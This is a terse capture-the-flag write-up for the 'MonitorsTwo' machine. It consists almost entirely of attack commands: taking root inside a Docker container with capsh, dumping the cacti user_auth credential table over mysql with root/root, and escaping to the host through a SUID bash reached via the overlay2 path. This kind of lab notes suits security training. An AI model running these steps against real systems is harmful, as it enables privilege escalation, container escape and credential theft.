# MonitorsTwo writeups
### Review
docker priv
```
capsh --gid==0 --uid=0 --
```
run mysql command in socket
```
mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth;"
```
priv host
```
# in docker
chmod u+s /bin/bash

# in host machine
findmnt
ls -al /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
```
